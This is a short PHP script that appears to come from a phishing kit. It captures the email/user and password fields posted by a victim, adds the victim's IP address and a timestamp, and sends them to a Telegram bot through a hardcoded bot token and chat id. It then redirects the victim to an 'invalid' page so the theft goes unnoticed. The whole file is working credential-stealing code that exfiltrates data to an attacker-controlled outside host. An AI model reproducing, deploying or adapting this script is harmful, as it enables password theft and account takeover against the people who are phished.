<?php

$ip = getenv("REMOTE_ADDR");
$message .= "------------------------------------\n";
$message .= "==================================================\n";
$message .= "Email/User            : ".$_POST['id']."\n";
$message .= "Password            : ".$_POST['pass']."\n";
$message .= "==================================================\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | YOUNG XA+MA+Ni : ".date("g:i:s:a || D-d-M-Y")."\n";
$message .= "==================================================\n";
$message .= "---------------Created BY XaMaNi------D-Young-------\n";
$token = "6232541594:AAG7CypqA2sPRNC2FSpCGM_TpmVANdr9_Ac";
$data = [
    'text' => $message,
    'chat_id' => '6000185320'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
@header("Location:invalid.php");
?>
